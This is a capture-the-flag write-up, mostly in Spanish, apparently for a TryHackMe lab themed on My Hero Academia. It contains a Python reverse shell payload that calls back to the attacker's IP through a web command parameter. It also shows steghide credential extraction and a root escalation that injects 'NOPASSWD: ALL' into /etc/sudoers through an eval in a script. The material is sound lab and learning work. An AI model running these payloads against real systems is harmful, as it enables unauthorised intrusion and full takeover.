First i will do a nmap scan to target 

[davidoberst@archlinux ~]$ sudo nmap -Pn -sV -O 10.65.145.2

we have : 
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

i open the webpage 
http://10.65.184.34/ 
im gonna do fuzzing
[davidoberst@archlinux Web-Content]$ gobuster dir -u http://10.65.184.34/ -w common.txt

no other items founded 
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.64.132.198
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htpasswd            (Status: 403) [Size: 278]
.htaccess            (Status: 403) [Size: 278]
assets               (Status: 301) [Size: 315] [--> http://10.64.132.198/assets/]
server-status        (Status: 403) [Size: 278]
Progress: 20481 / 20481 (100.00%)
===============================================================
Finished
===============================================================
al entrar a assets sale una pagina en blanco,, as ique hare fuzzing a la pagina desde assets, y encontre index.php 

.hta                 (Status: 403) [Size: 278]
.htaccess            (Status: 403) [Size: 278]
.htpasswd            (Status: 403) [Size: 278]
images               (Status: 301) [Size: 322] [--> http://10.64.132.198/assets/images/]
index.php            (Status: 200) [Size: 0]

luego de encontrar index .php en la sigueinte url : 
http://10.64.132.198/assets/index.php muestra una pagina en blanco, asi que ahora intentare hacer un fuzzing de paraemtros : 
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:              http://10.64.132.198/assets/index.php?FUZZ=id
[+] Method:           GET
[+] Threads:          10
[+] Wordlist:         /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
[+] Exclude Length:   0
[+] User Agent:       gobuster/3.8.2
[+] Timeout:          10s
===============================================================
Starting gobuster in fuzzing mode
===============================================================
[Status=200] [Length=72] [Word=cmd] http://10.64.132.198/assets/index.php?cmd=id
Progress: 6453 / 6453 (100.00%)

al poner el parametero : 
http://10.64.132.198/assets/index.php?cmd=id
el servidor rsponde con un mensaje esn texto plano : 
dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK
es base64, al decodficiarlo muestra : 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
note que al poner cualquier comando responde siempre con base 64, probe con ls y responde con : 
images
index.php
styles.css

intentare poner una reverse shell : 

listener : nc -lvnp 9999
payload : python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.138.111",9999));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'


recibi una respuestaen el listener : 

[davidoberst@archlinux ~]$ curl -g 'http://10.66.169.120/assets/index.php?cmd=python3%20-c%20%27import%20os%2Cpty%2Csocket%3Bs%3Dsocket.socket()%3Bs.connect((%22192.168.138.111%22%2C9999))%3B%5Bos.dup2(s.fileno()%2Cf)for%20f%20in(0%2C1%2C2)%5D%3Bpty.spawn(%22sh%22)%27'



[davidoberst@archlinux ~]$ nc -lvnp 9999
Listening on 0.0.0.0 9999
Connection received on 10.66.169.120 47292
$ ls
ls
images  index.php  styles.css
$ whoami 
whoami
www-data
$ 


encontre una carpeta llamada HIdden Content 

Hidden_Content  html
$ cd Hidden_COntent
cd Hidden_COntent
sh: 11: cd: can't cd to Hidden_COntent
$ cd Hidden_Content        
cd Hidden_Content
$ ls
ls
passphrase.txt
$ cat passphrase.txt
cat passphrase.txt
QWxsbWlnaHRGb3JFdmVyISEhCg==
$     

al decodificar el base64 dice :
AllmightForEver!!!

luego de buscar en los directorios, encontre la bandera, pero estaba bloqueada :

$ cd home
cd home
$ ls
ls
deku  ubuntu
$ cd deku
cd deku
$ ls
ls
user.txt
$ cat user.txt
cat user.txt
cat: user.txt: Permission denied

de todas formas, encontre unas imagenes en una ruta, intentare usar estaganografia para ver si contienen algo dentro de ellas. 

/var/www/html/assets
$ ls
ls
images  index.php  styles.css
$ cd images
cd images
$ ls
ls
oneforall.jpg  yuei.jpg
$ 

Levantare un servidor en python3 en la maquina victima para omar las imagenes desde mi terminal 

$ python3 -m http.server 8000
python3 -m http.server 8000


ahora las descargo 


[davidoberst@archlinux ~]$ wget http://10.67.189.74:8000/oneforall.jpg
--2026-06-19 01:31:50--  http://10.67.189.74:8000/oneforall.jpg
Connecting to 10.67.189.74:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 98264 (96K) [image/jpeg]
Saving to: ‘oneforall.jpg’

oneforall.jpg               100%[=========================================>]  95.96K   450KB/s    in 0.2s    

2026-06-19 01:31:51 (450 KB/s) - ‘oneforall.jpg’ saved [98264/98264]

[davidoberst@archlinux ~]$ wget http://10.67.189.74:8000/yuei.jpg
--2026-06-19 01:31:57--  http://10.67.189.74:8000/yuei.jpg
Connecting to 10.67.189.74:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 237170 (232K) [image/jpeg]
Saving to: ‘yuei.jpg’

yuei.jpg                    100%[=========================================>] 231.61K   823KB/s    in 0.3s    

2026-06-19 01:31:57 (823 KB/s) - ‘yuei.jpg’ saved [237170/237170]

the file oneforall.png is corrupted, so were going to fix it whit a tool "MagicBytes"


[davidoberst@archlinux ~]$ python3 magicbytes.py -i oneforall.jpg -m jpg
Magic bytes has been changed of oneforall.jpg as jpg
the image was repaired, so now i will use steghide to see if the file has embedded data

[davidoberst@archlinux ~]$ steghide extract -sf oneforall.jpg
Enter passphrase: 
wrote extracted data to "creds.txt".
[davidoberst@archlinux ~]$ cat creds.txt
Hi Deku, this is the only way I've found to give yosu your account credentials, as soon as you have them, delete this file:

deku:One?For?All_!!one1/A
[davidoberst@archlinux ~]$ 

now i will logon on ssh whit the new credentials

[davidoberst@archlinux ~]$ ssh deku@10.65.163.21

las credencilae me permitieron pasar exitosamente :

deku@ip-10-65-163-21:~$ 


ahora intenrae abrir de nuevo el archivo que antes no me permitia 

deku@ip-10-65-163-21:~$ ls
user.txt
deku@ip-10-65-163-21:~$ cat user.txt
THM{W3lC0m3_D3kU_1A_0n3f0rAll??}
deku@ip-10-65-163-21:~$ 

tenemos la primera bandera. ahora busquemos que enocntramos en el suaurio home/deku

buscando, encontre un script sh 

deku@ip-10-65-172-147:/$ cd opt
deku@ip-10-65-172-147:/opt$ ls -a
.  ..  NewComponent
deku@ip-10-65-172-147:/opt$ cd NewComponent
deku@ip-10-65-172-147:/opt/NewComponent$ ls
feedback.sh
deku@ip-10-65-172-147:/opt/NewComponent$ ls -a
.  ..  feedback.sh
deku@ip-10-65-172-147:/opt/NewComponent$ cat deedback.sh
cat: deedback.sh: No such file or directory
deku@ip-10-65-172-147:/opt/NewComponent$ cat feedback.sh
#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."

echo "Enter your feedback:"
read feedback


if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input." 
fi


desglosando el script vemos que hay un eval, con eso podemos ejecutar comandos a traves de payloads, sin embargo el desarrollador intenta evitar la ejecucion e inyeccion de comandos a traves de un condicional con parametros no permitidios, aun asi olvido poner una validacion de salto de linea, intentaremos implementar un payload con un salto de linea para ingresar a root


PAYLOAD : deku ALL=NOPASSWD: ALL >> /etc/sudoers


deku@ip-10-65-172-147:/opt/NewComponent$ sudo ./feedback.sh
Hello, Welcome to the Report Form       
This is a way to report various problems
    Developed by                        
        The Technical Department of U.A.
Enter your feedback:
deku ALL=NOPASSWD: ALL >> /etc/sudoers
It is This:
Feedback successfully saved.
deku@ip-10-65-172-147:/opt/NewComponent$ sudo -l
Matching Defaults entries for deku on ip-10-65-172-147:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on ip-10-65-172-147:
    (ALL) /opt/NewComponent/feedback.sh
    (root) NOPASSWD: ALL
deku@ip-10-65-172-147:/opt/NewComponent$ 



after that we acces to root 

root@ip-10-65-172-147:/# cd root
root@ip-10-65-172-147:~# ls
root.txt  snap
root@ip-10-65-172-147:~# cat root.txt
root@myheroacademia:/opt/NewComponent# cat /root/root.txt
__   __               _               _   _                 _____ _          
\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ 
 \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
                                  _    _ 
             _   _        ___    | |  | |
            | \ | | ___  /   |   | |__| | ___ _ __  ___
            |  \| |/ _ \/_/| |   |  __  |/ _ \ '__|/ _ \
            | |\  | (_)  __| |_  | |  | |  __/ |  | (_) |
            |_| \_|\___/|______| |_|  |_|\___|_|   \___/ 

THM{Y0U_4r3_7h3_NUm83r_1_H3r0}
